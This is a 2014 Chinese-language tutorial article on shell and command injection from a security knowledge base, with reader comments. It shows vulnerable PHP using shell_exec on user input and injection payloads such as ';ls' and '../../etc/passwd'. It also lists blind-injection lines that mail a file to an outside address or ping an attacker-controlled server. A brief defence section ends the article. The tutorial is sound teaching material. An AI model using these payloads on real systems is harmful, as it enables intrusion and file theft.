<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Shell Injection &amp; Command Injection</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">五道口杀气</a> <span class="bull">·</span> <time title="2014/03/06 10:29" ui-time="" datetime="2014/03/06 10:29" class="published ng-binding ng-isolate-scope">2014/03/06 10:29</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 前言</h2><hr><p>Shell注入(Shell Injection)，也被称为命令注入(Command Injection)，虽然不是最经常提及或发现的漏洞，但是危害巨大。</p><p>下面展开讨论一下shell注入。</p><h2>0x01 简单介绍</h2><hr><p>通常情况下，Web应用程序会有需要执行shell命令的时候，有可能只是使用Unix sendmail程序发送电子邮件，或运行指定的Perl和C + +程序。从开发的角度来看，这样做可以减少程序的开发时间。然而，如果数据是通过一个用户界面传递到这些程序中，则攻击者可能能够注入shell命令到这些后台程序。</p><p>举一个简单的例子：</p><pre><code>#!php
&lt;?php
echo shell_exec('cat '.$_GET['filename']);
?&gt;
</code></pre><p>看起来很好用，我们需要输出文件内容，直接用cat输出，比如同目录下有一个my&#95;great&#95;content.txt文件，那么请求的url就为：</p><pre><code>www.mysite.com/viewcontent.php?filename=my_great_content.txt
</code></pre><p>开发只需要一行代码，就可以达到期望的功能。</p><p>但是不幸的是，这段代码是不安全的，攻击者只需要使用一个分号（;）就可以继续执行其他的命令。</p><pre><code>www.mysite.com/viewcontent.php?filename=my_great_content.txt;ls
</code></pre><p>该页面除了返回文件内容之外呢，还返回了当前目录下的文件</p><p>实际上这个文件除了shell注入之外，还有目录遍历的问题，使用<code>../../etc/passwd</code>等获取其他文件内容。</p><h2>0x02 如何利用</h2><hr><p>在前面的内容中，我们看到了如何进行命令注入的简单案例。下面看下shell注入的几种情况，以及如何进行shell注入。假设一些我们经过分析，已经发现了一个网站有shell注入，那么你将有很多种注入的方式。</p><p>前面的例子中，获取文件名并使用cat命令获取文本内容输出，我们可以使用分号（;）分隔进行注入，然而肯定有开发人员意识到此问题了，可能会过滤分号，但是仍有绕过的方式，下面是在shell注入中可能会用的字符，介绍一下：</p><h3>重定向操作符</h3><p>例如：<code>&lt;，&gt;&gt;，&gt;</code></p><p>这些运算符是把结果输出到服务器的其他地方，&lt; 是从文件中而不是从键盘中读入命令输入，可能被用来绕过过滤。>是把结果重定向到文件中，而不是写在命令提示符窗口中。>>把结果追加到别的文本当中，而不改变原来的内容。</p><h3>管道符</h3><p>例如：<code>|</code></p><p>管道符可以把一个命令的输出重定向到下一个命令的输入，例如</p><pre><code>cat file1 | grep "string"
</code></pre><h3>inline命令</h3><p>例如：<code>;，,，$</code></p><p>用来结束之前的命令，直接执行新的命令。</p><h3>逻辑运算符</h3><p>例如：<code>$，&amp;&amp;，||</code></p><p>这些运算符用来对数据进行逻辑上的运算</p><h3>常见的注入语句与结果</h3><pre><code>`shell_command`  执行shell_command命令
$(shell_command) 执行shell_command命令
| shell_command 执行shell_command命令并返回结果
|| shell_command 执行shell_command命令并返回结果
; shell_command 执行shell_command命令并返回结果
&amp;&amp; shell_command 执行shell_command命令并返回结果
&gt; target_file 返回结果覆盖到target_file里
&gt;&gt; target_file 返回结果追加到target_file里
&lt; target_file 把target_file的内容输入到之前的命令当中
- operator 给目标指令添加额外的参数
</code></pre><h2>0x03 如何寻找shell注入</h2><hr><p>主要是寻找你怀疑的某个功能可以是后端用命令来执行的，可以进行简单的测试，由于操作系统系统可能不同，那么你测试的语句也应该是不一样的：</p><pre><code>(Windows) &lt;normal_input&gt;; dir c:
(Unix)    &lt;normal_input&gt;; ls
</code></pre><p>同时还要注意执行命令可能存在的引号，例如：</p><pre><code>#!php
&lt;?php
//sending the input directly. Attack with a string like file.txt;ls
echo shell_exec('cat '.$_GET['command']);
?&gt;

&lt;?php
//input is placed in quotes.  You must end the quotes to execute an injection.
//Craft an attack with a string like file.txt";ls
echo shell_exec('cat "'.$_GET['command']).'"';
?&gt;
</code></pre><h3>盲注</h3><p>如果有时候并没有命令回显，那么可以用以下方式检测是否存在盲注：</p><pre><code>file.txt;mail <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3347564047564173475640471d505c5e">[email&#160;protected]</a> &lt; file.txt    //send an email to yourself
file.txt;ping www.test.com      //ping a webserver you have control of
file.txt;echo "test" &gt; test.txt     //write the word "test" to test.txt. try opening this file with the browser. 
</code></pre><h2>0x04 如何防御</h2><hr><p>尽管上面说有很多方式进行shell注入，但是可以用几个简单的方式进行防御，最主要的是过滤所有用户输入的数据，最好是能避免用户的数据直接进入命令执行当中，如果不可避免，尽量避免（; | &amp;）等符号，最好是用白名单。</p><p>如果不能是白名单，PHP当中提供了escapeshellarg和escapeshellcmd两个函数进行过滤，但这并不能完全保障代码的安全性。需要具体情况再做相应的滤。</p><p>from:<a href="https://www.golemtechnologies.com/articles/shell-injection#how-to-test-if-website-vulnerable-to-command-injection">https://www.golemtechnologies.com/articles/shell-injection#how-to-test-if-website-vulnerable-to-command-injection</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/4322" rel="bookmark" id="re1">False SQL Injection and Advanced Blind SQL Injection</a></li><li><a href="http://drops.wooyun.org/papers/8413" rel="bookmark" id="re2">PfSense命令注入漏洞分析</a></li><li><a href="http://drops.wooyun.org/tips/3911" rel="bookmark" id="re3">PHP WDDX Serializier Data Injection Vulnerability</a></li><li><a href="http://drops.wooyun.org/tips/4605" rel="bookmark" id="re4">SQL Injection via DNS</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">包包</span> <span class="reply-time">2016-04-23 14:03:23</span></div><p></p><p>为啥我用windows 就没直接在cmd里面执行成功啊。。<br>chcp;whoami 报错呀。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">thanatos</span> <span class="reply-time">2015-12-25 11:11:22</span></div><p></p><p>学习了！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">号</span> <span class="reply-time">2015-11-08 17:37:54</span></div><p></p><p>好啊！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2014-05-19 02:09:07</span></div><p></p><p>`` 这样也有哦</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">luwikes</span> <span class="reply-time">2014-03-11 09:08:08</span></div><p></p><p>//Craft an attack with a string like file.txt";ls<br>echo shell_exec('cat "'.$_GET['command']).'"';<br>这儿是echo shell_exec('cat "'.$_GET['command'].'"');吧。<br>craft很有感觉。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">寂寞的瘦子</span> <span class="reply-time">2014-03-06 17:33:25</span></div><p></p><p>看不到，看不到，我╭(╯^╰)╮</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">wefgod</span> <span class="reply-time">2014-03-06 14:33:30</span></div><p></p><p>正好是我发的……所以一看标题就知道是这类了哈</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瞌睡龙</span> <span class="reply-time">2014-03-06 13:45:41</span></div><p></p><p>贴案例，赞！~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">wefgod</span> <span class="reply-time">2014-03-06 12:57:42</span></div><p></p><p>http://www.wooyun.org/bugs/wooyun-2014-051345<br>http://www.wooyun.org/bugs/wooyun-2014-052834<br>案例？其实ping本地127.0.0.1感觉时间变化就比较明显了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Coffee</span> <span class="reply-time">2014-03-06 12:47:18</span></div><p></p><p>新手学习了～</p><p></p></div></div></div></div></div></main>